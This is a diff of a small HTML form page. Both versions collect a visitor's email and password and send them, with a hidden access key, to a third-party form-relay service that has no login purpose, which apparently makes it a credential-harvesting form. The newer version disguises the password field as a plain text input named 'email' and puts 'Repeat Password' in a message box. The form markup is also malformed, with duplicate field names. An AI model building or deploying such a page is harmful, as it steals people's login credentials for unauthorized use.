@@ -1,68 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
-  <title>Hello, World!</title>
-  <style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #f4f4f9;
-        padding: 20px;
-    }
-
-    form {
-        background: white;
-        max-width: 400px;
-        margin: 50px auto;
-        padding: 20px;
-        box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        border-radius: 8px;
-    }
-
-    input[type="text"],
-    input[type="email"],
-    input[type="password"],
-    textarea {
-        width: 100%;
-        padding: 8px;
-        margin: 10px 0;
-        box-sizing: border-box;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-    }
-
-    input[type="text"]:focus,
-    input[type="email"]:focus,
-    input[type="password"]:focus,
-    textarea:focus {
-        border-color: #555;
-    }
-
-    button {
-        background-color: #5c67f2;
-        color: white;
-        border: none;
-        padding: 10px 20px;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        font-weight: bold;
-        border-radius: 4px;
-        cursor: pointer;
-    }
-
-    button:hover {
-        background-color: #4a54e1;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sample Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif; /* Sets the font for the page */
+            background-color: #f4f4f4; /* Light grey background for the page */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        form {
+            background-color: white; /* White background for the form */
+            padding: 20px;
+            border-radius: 8px; /* Rounded corners */
+            box-shadow: 0 0 10px rgba(0,0,0,0.1); /* Subtle shadow around the form */
+            width: 300px;
+        }
+        input[type="text"],
+        input[type="email"],
+        textarea {
+            width: 100%; /* Makes input fields take up the full width of the form */
+            padding: 8px;
+            margin-top: 6px;
+            margin-bottom: 16px;
+            border: 1px solid #ccc; /* Light grey border */
+            border-radius: 4px; /* Rounded corners for the input fields */
+        }
+        button {
+            background-color: #007BFF; /* Blue background color */
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            border-radius: 4px; /* Rounded corners for the button */
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #0056b3; /* Darker blue on hover */
+        }
+    </style>
 </head>
 <body>
-  <form action="https://api.web3forms.com/submit" method="POST">
-    <input type="hidden" name="access_key" value="39720635-cb0d-42d1-85f8-ffcd0e8af170">
-    <input type="email" name="email" placeholder="Your Email" required>
-    <input type="password" name="password" placeholder="Your Password" required>
-    <textarea name="message" placeholder="Your Message" required></textarea>
-    <input type="hidden" name="redirect" value="https://web3forms.com/success">
-    <button type="submit">Submit Form</button>
-  </form>
+    <form action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="39720635-cb0d-42d1-85f8-ffcd0e8af170">
+        <input type="text" name="email" placeholder="Email" required>
+        <input type="text" name="email" placeholder="Password" required>
+        <textarea name="message" placeholder="Repeat Password" required></textarea>
+        <input type="hidden" name="redirect" value="https://web3forms.com/success">
+        <button type="submit">Submit Form</button>
+    </form>
 </body>
-</html>
+                                           </html>
